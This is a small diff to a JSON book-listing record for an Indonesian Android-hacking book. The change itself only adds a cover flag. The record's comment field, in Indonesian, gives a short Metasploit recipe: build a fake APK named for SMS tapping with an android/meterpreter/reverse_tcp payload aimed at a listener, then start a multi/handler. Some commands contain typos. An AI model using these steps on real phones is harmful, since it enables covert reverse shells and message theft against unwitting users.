@@ -39,6 +39,7 @@
   ],
   "cover_url": "/cover_thumb/9938?v=1795435503",
   "cover_og_url": "/cover/9938/og?v=1795435503",
+  "has_cover": false,
   "url": "/book/hacking-catatan-hack-hp-android-onno-widodo-purbo/",
   "rating": null,
   "comment": "apk bukan dari playstore kemungkinan sudah ada script backdoor. msfconsole msf&gt; buat payload apk bohongan pakai msfpayload android/meterpreter/reverse_tcp LHOST=192.168.0.16 LPORT=666 R &gt; sadapsms.apk msf&gt; use explot/multi/hanler &gt; search android akan keluar beberapa hasil set payload msfpayload android/meterpreter/reverse_tcp LHOST dst.... show option LHOST = listener host LPORT = listener port",
